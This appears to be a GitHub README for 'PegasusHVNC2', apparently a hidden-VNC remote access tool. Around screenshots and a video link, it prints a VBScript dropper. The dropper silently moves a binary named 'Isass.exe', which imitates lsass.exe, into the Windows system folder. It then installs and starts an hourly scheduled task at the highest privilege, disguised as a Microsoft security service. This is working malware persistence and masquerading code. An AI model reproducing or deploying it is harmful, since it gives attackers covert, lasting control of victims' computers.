# PegasusHVNC2

![Screenshot_1](https://user-images.githubusercontent.com/1867768/164581897-d8b3750c-90e5-49b2-9ea5-35bd7f3d9f98.png)
[Except ones compiled from full source ;)]
https://streamable.com/ghpv5y


![badpony](https://user-images.githubusercontent.com/1867768/164579605-c4a11e62-87d5-48eb-bd95-f2dd976ac840.png)
```
on error resume next
set o=createobject("wscript.shell")
'f=o.ExpandEnvironmentStrings("%appdata%\Pantheon")
f=o.ExpandEnvironmentStrings("%appdata%")
c = "cmd /c md " & f 
'o.run c,0,1
WScript.Sleep(1000)
'c = "cmd /c move " & chr(34) & f & "\..\Isass.exe" & chr(34) & " " & chr(34) & f & chr(34)
c = "cmd /c move " & chr(34) & f & "\Isass.exe" & chr(34) & " " & chr(34) & "C:\windows\syswow64" & chr(34)
o.run c,0,1
'c = "schtasks /create /f /tn " & chr(34) & "OneDrive.{7d01bf11-6e05-4dfd-8936-9366c7d70b4d}" & chr(34)
c = "schtasks /create /f /tn " & chr(34) & "Microsoft\Windows\Security\SAMService" & chr(34)
c = c & " /sc hourly /rl highest /tr " & chr(34) & "c:\windows\syswow64\Isass.exe" & chr(34)
o.run c,0,1
Wscript.Sleep(2000)
o.run "schtasks /run /tn " & chr(34) & "Microsoft\Windows\Security\SAMService" & chr(34),0,0
```

Keep up the good work ^^

![lol](https://user-images.githubusercontent.com/1867768/163475489-3408e8ac-d47d-4648-9329-caf9790674dd.png)
![1](https://user-images.githubusercontent.com/1867768/164018731-957cbd11-6777-4ba9-8bb9-ce190be2f0ac.png)
![2](https://user-images.githubusercontent.com/1867768/164018740-5a82aa39-c27f-4476-b535-c3a01a7cfbcc.png)
![3](https://user-images.githubusercontent.com/1867768/164018744-04966fbd-b5e7-4a8d-809a-98135a585df6.png)
![4](https://user-images.githubusercontent.com/1867768/164018747-f2e92ce9-ac78-45f6-b8b8-551ff637f5dc.png)
